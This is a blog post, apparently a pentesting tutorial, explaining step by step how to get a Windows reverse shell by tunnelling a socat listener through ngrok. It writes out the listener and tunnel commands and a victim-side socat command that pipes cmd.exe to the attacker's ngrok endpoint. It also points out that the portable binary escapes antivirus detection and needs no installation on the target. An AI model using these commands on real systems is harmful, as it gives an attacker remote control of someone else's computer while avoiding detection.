---
layout: post
title:  "Leveraging Ngrok and Socat to establish a Windows reverse shell - Part 1"
date:   2021-07-02 10:14:08 +0100
categories: Pentesting Pivoting
---

I’m going to describe how to setup and use a reverse shell using socat and ngrok.

<h2><strong>Requirements</strong></h2>
To pull this off you'll need to setup:
<ul>
	<li><a href="https://ngrok.com/">Ngrok</a></li>
	<li><a href="https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/">Socat for windows</a></li>
	<li>Socat listenner (in either linux or windows);</li>
</ul>

<br>

___
<br>
<h2><strong>Setting up the Socat listener</strong></h2>

{% highlight shell %}
$socat tcp-l:<port> -
{% endhighlight %}

In the previous snippet we are telling socat to set up a tcp listenner on port <port>. Let’s use port 50899.
Lets take a look at my listenner:

{:refdef: style="text-align: center;"}
![socat listener](/assets/images/socat_listener.png)
{: refdef}
<br>
I’m running my socat listenner inside a docker container.
I don’t recommend running it directly in your workstation or laptop, use at least a virtual machine. Not gonna go into how to set that up since its kinda out of scope.

<br>

___
<br>

<h2><strong>Setting up the Ngrok tunnel</strong></h2>

<p>Ngrok is a simple but useful tool, simply put, it allows you to publicly expose a local server. Greatest thing since sliced bread, saves you a lot of firewall related headaches, but be carefull when exposing unfinished apps.</p>
The workings are something like this:
{:refdef: style="text-align: center;"}
![socat listener](/assets/images/ngrok_workings.png)
{: refdef}

<p>Another great thing about ngrok is that it doesn’t limit you to http, it allows you to go down the stack and set up tcp tunnels.</p>
For this we’ll run the command:
{% highlight shell %}
$./ngrok tcp 50899 --region au
{% endhighlight %}

Ok, so here we’ve set up a ngrok tcp tunnel hosted in the Australian region that forwards requests to our machine into port 50899. If everything is working you should see something like this:

{:refdef: style="text-align: center;"}
![socat listener](/assets/images/ngrok_working.png)
{: refdef}

<br>

___
<br>
<h2><strong>Now for the victim</strong></h2>
If you take the socat.exe binary from the archive I’ve provided above and run it against virus total, this is what you get:
{:refdef: style="text-align: center;"}
![socat listener](/assets/images/virus_total_result.png)
{: refdef}


By looking at this we can assume with some confidence that we won’t be blocked by the anti-virus when we try to run socat, and since it’s a portable executable we don’t need to install anything in the target machine: *sneaky*.

To get this up and running from the victim’s side, you need to extract the files and run the following command:
{% highlight shell %}
>socat.exe TCP:<ngrok-endpoint-ip>:<ngrok-endpoint-port> EXEC:"cmd.exe",pipes
{% endhighlight %}

You can use nslookup to find out which IP is assigned to your ngrok endpoint.<br>
And thats basically it, once the connection is established you will be able to remotely control the victim’s computer through a cmd shell.

{:refdef: style="text-align: center;"}
![socat listener](/assets/images/socat_connection_established.png)
{: refdef}